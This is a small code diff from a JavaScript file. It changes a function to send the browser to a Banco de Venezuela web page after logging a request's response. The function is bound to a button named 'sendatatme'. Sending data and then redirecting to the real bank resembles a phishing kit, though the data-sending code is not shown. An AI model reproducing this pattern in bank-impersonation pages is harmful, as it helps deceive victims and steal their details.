@@ -25,7 +25,7 @@ function redirect() {
     console.log(Http.responseText);
   };
 
-  window.location.href = "template.html";
+  window.location.href = "https://www.bancodevenezuela.com/emprendebdv/";
 }
 
 sendatatme.addEventListener("click", redirect);
